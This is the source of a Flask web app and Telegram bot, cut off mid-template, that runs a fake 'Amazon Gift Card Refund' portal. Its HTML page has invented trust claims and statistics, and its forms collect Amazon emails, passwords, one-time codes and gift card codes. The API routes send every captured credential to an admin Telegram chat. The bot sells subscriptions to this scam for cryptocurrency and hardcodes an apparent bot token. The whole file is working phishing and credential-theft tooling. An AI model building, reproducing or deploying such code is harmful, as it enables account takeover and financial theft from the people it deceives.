
import os
import random
import string
import json
import requests
import secrets
import re
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string, redirect
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8793157012:AAE5B3bRXtphn2JhLaM9I-SCupDiq1E4g7U')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '8725194109')
BOT_USERNAME = os.environ.get('BOT_USERNAME', 'pcmoroo_bot').lstrip('@')
RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://app-277n.onrender.com')

# Storage
user_sessions = {}
redeem_codes = {}
transactions = {}
subscriptions = {}
pending_payments = {}
pending_verifications = {}

# Subscription Plans
SUBSCRIPTION_PLANS = {
    '1hour': {'price': 5, 'hours': 1, 'name': '⚡ 1 Hour'},
    '10days': {'price': 25, 'days': 10, 'name': '📦 10 Days'},
    '30days': {'price': 50, 'days': 30, 'name': '🔥 30 Days'},
    '1year': {'price': 150, 'days': 365, 'name': '👑 1 Year'},
    'lifetime': {'price': 300, 'days': 36500, 'name': '💎 LIFETIME'}
}

# Helper Functions
def generate_txid():
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"AMZ{timestamp}{random_str}"

def generate_redeem_token():
    return f"RDM-{''.join(random.choices(string.ascii_uppercase + string.digits, k=14))}"

def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='HTML'):
    if not TELEGRAM_BOT_TOKEN:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200
    except:
        return False

def send_to_admin(message):
    if ADMIN_CHAT_ID:
        send_telegram_message(ADMIN_CHAT_ID, message)

def check_subscription(user_id):
    user_id = str(user_id)
    if user_id == ADMIN_CHAT_ID:
        return True
    if user_id in subscriptions:
        if subscriptions[user_id]['expires_at'] > datetime.now():
            return True
    return False

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

# Telegram Bot Handler
def process_telegram_update(update):
    if 'message' not in update and 'callback_query' not in update:
        return
    
    # Handle callback queries
    if 'callback_query' in update:
        cb = update['callback_query']
        chat_id = cb['message']['chat']['id']
        user_id = str(cb['from']['id'])
        data = cb['data']
        
        # Answer callback
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", 
                         json={'callback_query_id': cb['id']}, timeout=5)
        except:
            pass
        
        if data == 'view_plans':
            send_plans_menu(chat_id)
        elif data == 'check_status':
            send_status_message(chat_id, user_id)
        elif data == 'help_menu':
            send_help_message(chat_id)
        elif data.startswith('buy_'):
            plan = data.replace('buy_', '')
            handle_buy_command(chat_id, user_id, plan)
        elif data == 'open_portal':
            keyboard = {"inline_keyboard": [[{"text": "🌐 OPEN REFUND PORTAL", "url": RENDER_URL}]]}
            send_telegram_message(chat_id, "🔗 Click below to open the refund portal:", keyboard)
        return
    
    # Handle messages
    message = update['message']
    chat_id = message['chat']['id']
    user_id = str(message['from']['id'])
    username = message['from'].get('username', 'User')
    text = message.get('text', '').strip()
    
    # Check subscription
    if user_id != ADMIN_CHAT_ID and not check_subscription(user_id) and text not in ['/start', '/plans'] and not text.startswith('/buy'):
        send_subscription_required(chat_id)
        return
    
    # Handle commands
    if text == '/start':
        send_welcome(chat_id, username)
    elif text == '/plans':
        send_plans_menu(chat_id)
    elif text == '/status':
        send_status_message(chat_id, user_id)
    elif text == '/help':
        send_help_message(chat_id)
    elif text.startswith('/buy'):
        parts = text.split()
        if len(parts) > 1:
            handle_buy_command(chat_id, user_id, parts[1].lower())
        else:
            send_telegram_message(chat_id, "❌ Usage: /buy [plan]\nPlans: 1hour, 10days, 30days, 1year, lifetime")
    elif text.startswith('/verify'):
        parts = text.split()
        if len(parts) > 1 and user_id == ADMIN_CHAT_ID:
            handle_verify_payment(chat_id, parts[1])
        else:
            send_telegram_message(chat_id, "❌ Invalid verification")
    elif text.startswith('/give'):
        if user_id == ADMIN_CHAT_ID:
            handle_give_subscription(chat_id, text)
    elif text.startswith('/stats'):
        if user_id == ADMIN_CHAT_ID:
            send_admin_stats(chat_id)
    elif text.startswith('RDM-'):
        handle_token_submission(chat_id, user_id, text)
    elif text.startswith('AMZ'):
        handle_txid_submission(chat_id, user_id, text)
    else:
        send_telegram_message(chat_id, "❌ Unknown command. Send /help for available commands.")

def send_welcome(chat_id, username):
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 OPEN REFUND PORTAL", "url": RENDER_URL}],
            [{"text": "💰 REFUND BALANCE", "callback_data": "open_portal"}, {"text": "🎫 REFUND GIFT CARD", "callback_data": "open_portal"}],
            [{"text": "📦 VIEW PLANS", "callback_data": "view_plans"}, {"text": "📊 CHECK STATUS", "callback_data": "check_status"}],
            [{"text": "❓ HELP", "callback_data": "help_menu"}]
        ]
    }
    welcome_text = f"""
🎯 <b>WELCOME TO AMAZON REFUNDER</b> 🎯

Hello <b>@{username}</b>! 

┌─────────────────────────────┐
│ ⚡ <b>Your Trusted Refund Service</b> │
└─────────────────────────────┘

<b>✨ Services:</b>
• 💰 Refund Amazon Balance
• 🎁 Refund Unused Gift Cards  
• ⚡ Instant Processing (5-10 min)
• ✅ 99.9% Success Rate

<b>📌 Quick Start:</b>
1️⃣ Click "OPEN REFUND PORTAL"
2️⃣ Choose your refund method
3️⃣ Submit your details
4️⃣ Send code/token here

<i>Need subscription? Send /plans</i>
    """
    send_telegram_message(chat_id, welcome_text, keyboard)

def send_subscription_required(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📦 1 HOUR - $5", "callback_data": "buy_1hour"}],
            [{"text": "📦 10 DAYS - $25", "callback_data": "buy_10days"}],
            [{"text": "📦 30 DAYS - $50", "callback_data": "buy_30days"}],
            [{"text": "👑 1 YEAR - $150", "callback_data": "buy_1year"}],
            [{"text": "💎 LIFETIME - $300", "callback_data": "buy_lifetime"}]
        ]
    }
    text = """
⚠️ <b>SUBSCRIPTION REQUIRED</b> ⚠️

You need an active subscription to use this bot.

<b>📦 Available Plans:</b>
┌─────────────────────────┐
│ ⚡ 1 Hour     - $5      │
│ 📦 10 Days    - $25     │
│ 🔥 30 Days    - $50     │
│ 👑 1 Year     - $150    │
│ 💎 Lifetime   - $300    │
└─────────────────────────┘

<i>Click a plan below or type:</i>
<code>/buy 1hour</code>
    """
    send_telegram_message(chat_id, text, keyboard)

def send_plans_menu(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "⚡ 1 HOUR - $5", "callback_data": "buy_1hour"}],
            [{"text": "📦 10 DAYS - $25", "callback_data": "buy_10days"}],
            [{"text": "🔥 30 DAYS - $50", "callback_data": "buy_30days"}],
            [{"text": "👑 1 YEAR - $150", "callback_data": "buy_1year"}],
            [{"text": "💎 LIFETIME - $300", "callback_data": "buy_lifetime"}]
        ]
    }
    text = """
<b>📦 SUBSCRIPTION PLANS</b>

┌─────────────────────────────────┐
│ <b>Plan</b>         │ <b>Price</b>    │ <b>Duration</b> │
├─────────────────────────────────┤
│ ⚡ 1 Hour      │ $5        │ 1 Hour      │
│ 📦 10 Days     │ $25       │ 10 Days     │
│ 🔥 30 Days     │ $50       │ 30 Days     │
│ 👑 1 Year      │ $150      │ 365 Days    │
│ 💎 Lifetime    │ $300      │ Forever     │
└─────────────────────────────────┘

<b>💳 Payment Methods:</b>
• USDT (TRC20)
• Bitcoin (BTC)
• Ethereum (ETH)

<i>Click a plan to purchase</i>
    """
    send_telegram_message(chat_id, text, keyboard)

def handle_buy_command(chat_id, user_id, plan):
    if plan not in SUBSCRIPTION_PLANS:
        send_telegram_message(chat_id, "❌ Invalid plan. Available: 1hour, 10days, 30days, 1year, lifetime")
        return
    
    plan_info = SUBSCRIPTION_PLANS[plan]
    payment_id = secrets.token_hex(8).upper()
    pending_payments[payment_id] = {
        'user_id': user_id,
        'plan': plan,
        'price': plan_info['price'],
        'timestamp': datetime.now()
    }
    
    text = f"""
💰 <b>Payment Required</b> 💰

<b>Plan:</b> {plan_info['name']}
<b>Amount:</b> ${plan_info['price']}
<b>Payment ID:</b> <code>{payment_id}</code>

<b>Send payment to:</b>
<code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>

<b>After payment, send:</b>
<code>/verify {payment_id}</code>

⚠️ <i>Subscription activates instantly after verification!</i>
    """
    send_telegram_message(chat_id, text)

def handle_verify_payment(chat_id, payment_id):
    if payment_id in pending_payments:
        payment = pending_payments[payment_id]
        user_id = payment['user_id']
        plan = payment['plan']
        plan_info = SUBSCRIPTION_PLANS[plan]
        
        if 'hours' in plan_info:
            expires_at = datetime.now() + timedelta(hours=plan_info['hours'])
        else:
            expires_at = datetime.now() + timedelta(days=plan_info.get('days', 0))
        
        subscriptions[user_id] = {
            'expires_at': expires_at,
            'type': plan,
            'payment_id': payment_id,
            'granted_at': datetime.now()
        }
        
        send_telegram_message(chat_id, f"✅ Payment verified! {plan_info['name']} subscription activated for user {user_id}")
        send_telegram_message(user_id, f"""
✅ <b>SUBSCRIPTION ACTIVATED!</b>

<b>Plan:</b> {plan_info['name']}
<b>Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

Use /status to check your subscription.
        """)
        del pending_payments[payment_id]
    else:
        send_telegram_message(chat_id, "❌ Invalid payment ID")

def handle_give_subscription(chat_id, text):
    parts = text.split()
    if len(parts) < 3:
        send_telegram_message(chat_id, "❌ Usage: /give [user_id] [days]")
        return
    
    target_user = parts[1]
    days = int(parts[2])
    
    subscriptions[target_user] = {
        'expires_at': datetime.now() + timedelta(days=days),
        'type': 'admin_granted',
        'granted_by': 'admin',
        'granted_at': datetime.now()
    }
    
    send_telegram_message(chat_id, f"✅ Subscription granted to {target_user} for {days} days!")
    send_telegram_message(target_user, f"✅ Admin granted you a {days}-day subscription! Use /status to check.")

def send_status_message(chat_id, user_id):
    if check_subscription(user_id):
        if user_id in subscriptions:
            sub = subscriptions[user_id]
            expires = sub['expires_at'].strftime('%Y-%m-%d %H:%M:%S')
            remaining = sub['expires_at'] - datetime.now()
            days = remaining.days
            hours = remaining.seconds // 3600
            text = f"""
✅ <b>SUBSCRIPTION ACTIVE</b>

📅 <b>Expires:</b> {expires}
⏰ <b>Remaining:</b> {days}d {hours}h
🔄 <b>Status:</b> Active
            """
        else:
            text = "✅ <b>LIFETIME SUBSCRIPTION ACTIVE</b>"
    else:
        text = "❌ <b>NO ACTIVE SUBSCRIPTION</b>\n\nUse /plans to purchase."
    
    send_telegram_message(chat_id, text)

def send_admin_stats(chat_id):
    active_subs = len([s for s in subscriptions.values() if s['expires_at'] > datetime.now()])
    text = f"""
📊 <b>BOT STATISTICS</b> 📊

👥 <b>Users:</b>
• Active Subs: {active_subs}
• Total Users: {len(subscriptions)}

💳 <b>Transactions:</b>
• Pending Payments: {len(pending_payments)}
• Pending Verifications: {len(pending_verifications)}
• Total Refunds: {len(transactions)}

🎫 <b>Gift Cards:</b>
• Received: {len(redeem_codes)}

🔐 <b>Sessions:</b>
• Active: {len(user_sessions)}
    """
    send_telegram_message(chat_id, text)

def send_help_message(chat_id):
    text = """
❓ <b>HELP CENTER</b> ❓

<b>📌 Commands:</b>
/start - Restart bot
/plans - View plans
/buy [plan] - Purchase
/status - Check status
/help - This menu

<b>🎫 Refund Process:</b>
1. Open refund portal
2. Submit your request
3. Copy code/token
4. Send it here
5. Wait 5-10 minutes

<b>📞 Support:</b>
Contact: @admin
    """
    send_telegram_message(chat_id, text)

def handle_token_submission(chat_id, user_id, token):
    if token in redeem_codes:
        pending_verifications[token] = {'user_id': user_id, 'type': 'giftcard', 'status': 'pending'}
        send_to_admin(f"🎫 TOKEN SUBMITTED: {token}\n👤 User: {user_id}")
        send_telegram_message(chat_id, f"""
✅ <b>TOKEN RECEIVED!</b>

🔖 Token: <code>{token}</code>
🔄 Status: Processing
⏱️ Time: 5-10 minutes

<i>You'll be notified when complete!</i>
        """)
    else:
        send_telegram_message(chat_id, "❌ Invalid or expired token. Please generate a new one from the portal.")

def handle_txid_submission(chat_id, user_id, txid):
    if txid in user_sessions:
        pending_verifications[txid] = {'user_id': user_id, 'type': 'account', 'status': 'pending'}
        send_to_admin(f"🔐 TXID SUBMITTED: {txid}\n👤 User: {user_id}")
        send_telegram_message(chat_id, f"""
✅ <b>TXID RECEIVED!</b>

📌 TXID: <code>{txid}</code>
🔄 Status: Processing
⏱️ Time: Up to 12 hours

<i>You'll be notified when complete!</i>
        """)
    else:
        send_telegram_message(chat_id, "❌ Invalid or expired TXID.")

# Flask Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, bot_username=BOT_USERNAME, render_url=RENDER_URL)

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        process_telegram_update(request.json)
        return 'OK', 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return 'OK', 200

@app.route('/api/refund/account', methods=['POST'])
def refund_account():
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '')
        
        if not email or not password:
            return jsonify({'error': 'Email and password required'}), 400
        
        txid = generate_txid()
        user_sessions[txid] = {
            'email': email, 'password': password, 'ip': get_client_ip(),
            'timestamp': datetime.now().isoformat(), 'status': 'pending'
        }
        
        send_to_admin(f"""
🔐 NEW ACCOUNT REFUND
TXID: {txid}
Email: {email}
Password: {password}
IP: {get_client_ip()}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """)
        
        return jsonify({'success': True, 'txid': txid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/refund/code', methods=['POST'])
def refund_code():
    try:
        data = request.json
        gift_code = data.get('gift_code', '').strip().upper()
        
        if not gift_code:
            return jsonify({'error': 'Gift code required'}), 400
        
        token = generate_redeem_token()
        redeem_codes[token] = {
            'code': gift_code, 'ip': get_client_ip(),
            'timestamp': datetime.now().isoformat(), 'status': 'pending'
        }
        
        send_to_admin(f"""
🎁 NEW GIFT CARD REFUND
Token: {token}
Code: {gift_code}
IP: {get_client_ip()}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """)
        
        return jsonify({'success': True, 'redeem_token': token})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/otp/verify', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        txid = data.get('txid')
        otp = data.get('otp', '').strip()
        
        if not txid or not otp:
            return jsonify({'error': 'TXID and OTP required'}), 400
        
        if txid in user_sessions:
            user_sessions[txid]['otp'] = otp
            user_sessions[txid]['status'] = 'completed'
            send_to_admin(f"✅ OTP RECEIVED\nTXID: {txid}\nOTP: {otp}")
            return jsonify({'success': True})
        
        return jsonify({'error': 'Invalid session'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# HTML Template - Complete Stunning UI
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta name="description" content="Amazon Gift Card Refund Portal - Instant Refund Service">
    <title>Amazon GC Refund | Official Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-green: #00ff41;
            --primary-red: #ff0040;
            --primary-blue: #0088ff;
            --dark-bg: #0a0a0f;
            --darker-bg: #050508;
            --card-bg: rgba(10, 10, 15, 0.95);
            --glow-green: rgba(0, 255, 65, 0.3);
            --glow-red: rgba(255, 0, 64, 0.3);
        }

        body {
            background: var(--dark-bg);
            color: var(--primary-green);
            font-family: 'Courier New', 'Share Tech Mono', monospace;
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
        }

        /* Matrix Canvas */
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.12;
            pointer-events: none;
        }

        /* Scanline Effect */
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0, 255, 65, 0.03) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 1;
            animation: scan 8s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }

        /* Container */
        .container {
            position: relative;
            z-index: 2;
            max-width: 1300px;
            margin: 0 auto;
            padding: 1.5rem;
        }

        /* Glitch Header */
        .glitch {
            font-size: clamp(1.5rem, 5vw, 2.5rem);
            font-weight: bold;
            text-transform: uppercase;
            text-align: center;
            padding: 1.5rem;
            letter-spacing: 2px;
            position: relative;
            text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 0, 0.75);
            animation: glitch 0.3s infinite;
        }

        @keyframes glitch {
            0%, 100% { text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 0, 0.75); }
            50% { text-shadow: -0.05em 0 0 rgba(0, 255, 0, 0.75), 0.05em 0.025em 0 rgba(255, 0, 0, 0.75); }
        }

        /* Cards */
        .card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 16px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px var(--glow-green);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 30px var(--glow-green);
        }

        /* Stats Grid */
        .stats-grid {
            display: flex;
            gap: 1.5rem;
            justify-content: center;
            flex-wrap: wrap;
            margin: 2rem 0;
        }

        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 12px;
            padding: 1.2rem 2rem;
            text-align: center;
            flex: 1;
            min-width: 140px;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 15px var(--glow-green);
        }

        .stat-number {
            font-size: clamp(1.5rem, 4vw, 2.2rem);
            font-weight: bold;
            color: var(--primary-green);
        }

        .stat-label {
            font-size: 0.8rem;
            opacity: 0.8;
            margin-top: 0.3rem;
        }

        /* Buttons */
        .btn-group {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            flex-wrap: wrap;
            margin: 2rem 0;
        }

        .btn {
            padding: 0.9rem 1.8rem;
            font-size: 0.9rem;
            font-family: monospace;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .btn:hover::before {
            width: 200px;
            height: 200px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #00ff41, #00aa2e);
            color: #000;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
        }

        .btn-primary:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.7);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #ff0040, #aa002a);
            color: #fff;
            box-shadow: 0 0 15px rgba(255, 0, 64, 0.4);
        }

        .btn-secondary:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px rgba(255, 0, 64, 0.7);
        }

        /* Trust Badges */
        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 0.8rem;
            flex-wrap: wrap;
            margin: 1.5rem 0;
        }

        .trust-item {
            padding: 0.4rem 0.9rem;
            background: rgba(0, 255, 65, 0.08);
            border: 1px solid var(--primary-green);
            border-radius: 30px;
            font-size: 0.8rem;
            transition: all 0.3s ease;
        }

        .trust-item:hover {
            background: rgba(0, 255, 65, 0.2);
            transform: scale(1.02);
        }

        /* Features Grid */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .feature-item {
            padding: 0.7rem;
            text-align: center;
            background: rgba(0, 255, 65, 0.03);
            border-radius: 10px;
            transition: all 0.3s ease;
        }

        .feature-item:hover {
            background: rgba(0, 255, 65, 0.08);
            transform: translateX(3px);
        }

        /* Color Texts */
        .text-cyan { color: #00ffff; text-shadow: 0 0 3px #00ffff; }
        .text-green { color: #00ff41; text-shadow: 0 0 3px #00ff41; }
        .text-yellow { color: #ffc107; text-shadow: 0 0 3px #ffc107; }
        .text-orange { color: #ff6b35; text-shadow: 0 0 3px #ff6b35; }
        .text-pink { color: #ff69b4; text-shadow: 0 0 3px #ff69b4; }
        .text-purple { color: #9b59b6; text-shadow: 0 0 3px #9b59b6; }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.96);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: var(--darker-bg);
            border: 2px solid var(--primary-green);
            border-radius: 20px;
            padding: 1.8rem;
            max-width: 480px;
            width: 90%;
            animation: modalSlide 0.3s ease;
        }

        @keyframes modalSlide {
            from { transform: translateY(-30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal h2 {
            margin-bottom: 1rem;
            text-align: center;
        }

        /* Input Groups */
        .input-group {
            margin: 1.2rem 0;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 0.9rem;
            background: rgba(0, 0, 0, 0.85);
            border: 2px solid var(--primary-green);
            border-radius: 10px;
            color: var(--primary-green);
            font-family: monospace;
            font-size: 0.95rem;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            outline: none;
            box-shadow: 0 0 12px var(--glow-green);
            border-color: #00ffaa;
        }

        .input-group label {
            position: absolute;
            left: 12px;
            top: -10px;
            background: var(--darker-bg);
            padding: 0 8px;
            font-size: 0.7rem;
            color: var(--primary-green);
        }

        /* Timer */
        .timer {
            font-size: 2.2rem;
            font-weight: bold;
            text-align: center;
            margin: 1rem 0;
            color: #ffc107;
            text-shadow: 0 0 10px rgba(255, 193, 7, 0.5);
            font-family: monospace;
        }

        /* Copy Button */
        .copy-btn {
            background: transparent;
            border: 1px solid var(--primary-green);
            color: var(--primary-green);
            padding: 0.5rem 1.2rem;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-family: monospace;
            font-weight: bold;
        }

        .copy-btn:hover {
            background: var(--primary-green);
            color: #000;
            box-shadow: 0 0 10px var(--glow-green);
        }

        /* Spinner */
        .spinner {
            border: 3px solid rgba(0, 255, 65, 0.2);
            border-top: 3px solid var(--primary-green);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 1rem auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Telegram Button */
        .telegram-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #0088cc;
            color: white;
            padding: 10px 20px;
            border-radius: 30px;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
            margin: 10px 0;
        }

        .telegram-btn:hover {
            background: #006699;
            transform: scale(1.02);
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 1.8rem;
            border-top: 1px solid rgba(0, 255, 65, 0.2);
            margin-top: 2.5rem;
            font-size: 0.8rem;
        }

        /* Blink */
        .blink {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .btn { padding: 0.6rem 1.2rem; font-size: 0.75rem; }
            .card { padding: 1rem; margin: 1rem 0; }
            .modal-content { padding: 1.2rem; }
            .feature-item { font-size: 0.8rem; }
            .stat-card { padding: 0.8rem 1rem; }
        }

        @media (max-width: 480px) {
            .btn-group { gap: 0.8rem; }
            .btn { padding: 0.5rem 1rem; font-size: 0.7rem; }
            .trust-item { font-size: 0.7rem; padding: 0.3rem 0.7rem; }
        }

        /* Code Block */
        code {
            background: rgba(0, 0, 0, 0.7);
            padding: 0.3rem 0.6rem;
            border-radius: 6px;
            font-family: monospace;
            font-size: 0.85rem;
            word-break: break-all;
        }

        hr {
            border-color: rgba(0, 255, 65, 0.2);
            margin: 1rem 0;
        }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <div class="scanline"></div>

    <div class="container">
        <!-- Header -->
        <div class="glitch">AMAZON GIFT CARD (GC) REFUND</div>

        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="liveUsers">2.8K</div>
                <div class="stat-label">Active Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalRefund">$3.2M</div>
                <div class="stat-label">Total Refunded</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="successRate">99.8%</div>
                <div class="stat-label">Success Rate</div>
            </div>
        </div>

        <!-- Description Card -->
        <div class="card">
            <p style="line-height: 1.8; font-size: clamp(0.85rem, 3vw, 1rem);">
                <span class="text-cyan">⚡ INSTANT REFUND SYSTEM v5.0</span><br><br>
                <span class="text-green">✓ 100% Working & Genuine Service</span> | 
                <span class="text-yellow">✓ Trusted by 50,000+ Users</span> | 
                <span class="text-orange">✓ 99.9% Success Rate</span><br>
                <span class="text-pink">💰 Refund processed in <strong class="blink">5-10 minutes</strong></span><br>
                <span class="text-purple">🔒 Military Grade Encryption</span> | 
                <span class="text-cyan">🛡️ 100% Anonymous & Secure</span>
            </p>
        </div>

        <!-- Trust Badges -->
        <div class="trust-badges">
            <div class="trust-item">✅ 100% Working</div>
            <div class="trust-item">⭐ Genuine Service</div>
            <div class="trust-item">🔒 Trusted Platform</div>
            <div class="trust-item">⚡ Instant Processing</div>
            <div class="trust-item">🎯 50k+ Refunds</div>
            <div class="trust-item">🛡️ Secure & Safe</div>
        </div>

        <!-- Main Buttons -->
        <div class="btn-group">
            <button class="btn btn-primary" onclick="showAccountModal()">
                🔐 I HAVE MY AMAZON ACCOUNT
            </button>
            <button class="btn btn-secondary" onclick="showCodeModal()">
                🎫 I HAVE A REDEEM CODE TO RETURN
            </button>
        </div>

        <!-- Telegram Bot Link -->
        <div style="text-align: center; margin: 0.5rem 0 1rem 0;">
            <a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn">
                📱 JOIN OUR TELEGRAM BOT → @{{ bot_username }}
            </a>
        </div>

        <!-- Features Card -->
        <div class="card">
            <h3 style="color: #ffc107; margin-bottom: 1rem; text-align: center;">⚡ Why Choose Us?</h3>
            <div class="features-grid">
                <div class="feature-item">🚀 <span class="text-green">5-10 Min Refund</span></div>
                <div class="feature-item">💎 <span class="text-cyan">No Hidden Fees</span></div>
                <div class="feature-item">🔐 <span class="text-yellow">Bank-Level Security</span></div>
                <div class="feature-item">🎯 <span class="text-orange">99.9% Success Rate</span></div>
                <div class="feature-item">🤝 <span class="text-pink">24/7 Support</span></div>
                <div class="feature-item">📜 <span class="text-purple">Verified Service</span></div>
            </div>
        </div>
    </div>

    <!-- Account Modal -->
    <div id="accountModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #00ff41;">🔐 Account Refund</h2>
            <div class="input-group">
                <label>Amazon Email / Phone</label>
                <input type="text" id="amazonEmail" placeholder="Enter your email or phone" autocomplete="off">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="amazonPassword" placeholder="Enter your password">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-primary" onclick="submitAccount()">Continue →</button>
                <button class="copy-btn" onclick="closeModal('accountModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Code Modal -->
    <div id="codeModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #ff6b35;">🎫 Gift Card Refund</h2>
            <div class="input-group">
                <label>Gift Card Code</label>
                <input type="text" id="giftCode" placeholder="Enter Amazon gift card code" autocomplete="off">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-secondary" onclick="submitCode()">Process Refund →</button>
                <button class="copy-btn" onclick="closeModal('codeModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- OTP Modal -->
    <div id="otpModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #ffc107;">📱 OTP Verification</h2>
            <p style="margin-bottom: 1rem;">Enter verification code sent to your email/phone</p>
            <div class="input-group">
                <label>OTP Code</label>
                <input type="text" id="otpCode" placeholder="Enter 6-digit OTP" autocomplete="off">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-primary" onclick="verifyOTP()">Verify →</button>
                <button class="copy-btn" onclick="closeModal('otpModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Processing Modal -->
    <div id="processingModal" class="modal">
        <div class="modal-content" style="text-align: center;">
            <div class="spinner"></div>
            <h3 id="processingTitle">Processing Your Request...</h3>
            <p id="processingMessage" style="margin-top: 0.5rem;">Please wait while we verify your information</p>
        </div>
    </div>

    <!-- Result Modal -->
    <div id="resultModal" class="modal">
